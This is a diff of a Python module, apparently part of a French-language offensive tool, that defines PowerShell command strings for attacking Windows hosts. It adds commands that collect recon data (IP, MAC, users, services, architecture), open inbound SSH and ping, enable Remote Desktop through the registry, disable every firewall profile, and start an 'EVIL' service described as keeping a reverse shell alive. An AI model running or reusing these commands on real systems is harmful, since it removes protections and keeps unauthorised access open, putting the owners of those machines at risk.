@@ -1,28 +1,50 @@
 #!/usr/bin/env python
+#coding=utf-8
+
+__author__ = 'Karl Boulais'
 
 from enum import Enum
 import subprocess
 
-class Powershell(Enum):
-    """Donnes accès à un enum de commandes powershell"""
+# Global
+psPrefix = "powershell -command "
 
-    # Get user data
-    GETLOCALIP   = "(Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias 'Ethernet *').IPAddress"
-    GETMAC       = "((Out-String -InputObject (Get-NetAdapter -Physical | Format-List -Property MacAddress)).split(':')[1]).Trim()"
-    GETUSERS     = "(Out-String -InputObject (Get-LocalUser | Where-object { $_.Enabled -like 'True' } | Format-List -Property Name)).Replace('Name : ', '').Split([Environment]::NewLine, [StringSplitOptions]::RemoveEmptyEntries)"
-    GETHOSTNAME  = "[System.Net.Dns]::GetHostName()"
+class Powershell():
+    """Donnes accès à un enum de commandes powershell"""
     
-    # Open Port and services
-    OPENSSHPORT  = ""
-    ALLOWRDP     = ""
-    ALLOWPING    = ""
-    PERSIST      = ""
+    class GetInfo(Enum):
+        # Get user data
+        GETLOCALIP          = f"{psPrefix}(Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias 'Ethernet *').IPAddress"
+        GETMAC              = f"{psPrefix}((Out-String -InputObject (Get-NetAdapter -Physical | Format-List -Property MacAddress)).split(':')[1]).Trim()"
+        GETUSERS            = f"{psPrefix}(Out-String -InputObject (Get-LocalUser | Where-object {{ $_.Enabled -like 'True' }} | Format-List -Property Name)).Replace('Name : ', '').Split([Environment]::NewLine, [StringSplitOptions]::RemoveEmptyEntries)"
+        GETHOSTNAME         = f"{psPrefix}[System.Net.Dns]::GetHostName()"
+        GETRUNNINGSERVICES  = f"{psPrefix}Get-Service | Where-Object {{$_.Status -eq 'Running'}}"
+        GETARCH             = f"{psPrefix}(wmic os get osarchitecture)[2]"
+
+    class OpenPorts(Enum):
+        # Open Port and services
+        OPENSSHPORT         = f"{psPrefix}New-NetFirewallRule -DisplayName 'ALLOW TCP PORT 21' -Direction inbound -Profile Any -Action Allow -LocalPort 22 -Protocol TCP"
+        ALLOWPING           = f"{psPrefix}netsh advfirewall firewall add rule name='ICMP Allow incoming V4 echo request' protocol=icmpv4:8,any dir=in action=allow"
+        ALLOWRDP            = f"{psPrefix}Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
+        DEACTIVATEFIREWALL  = f"{psPrefix}Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
+
+    class ActivateServices(Enum):
+        ENABLERDP           = f"{psPrefix}Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name 'fDenyTSConnections' -Value 0 && ; Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name 'UserAuthentication' -Value 1"    
+
+    # Ajouté un service pour faire persister la connexion reverseShell
+    class Persist(Enum):
+        STARTEVILSERVICE    = f"{psPrefix}Get-Service -name 'EVIL*' | Start-Service"
+        CHECKEVILSTATUS     = f"{psPrefix}(Get-Service -Name 'EVIL*').status"
 
     # TODO: OPTIONNEL
     # GETADMINPASS = ""
     # GETPUBLICIP  = ""
 
-    
-
-
-    
+if __name__ == "__main__":
+    pass
+    # test = Powershell.GETLOCALIP.value
+    # print(str(test))
+    # print(Powershell.GetInfo.GETARCH.value)
+    # subprocess.call(Powershell.GetInfo.GETUSERS.value)
+    # for command in (Powershell.GetInfo):
+    #     subprocess.call(command.value)
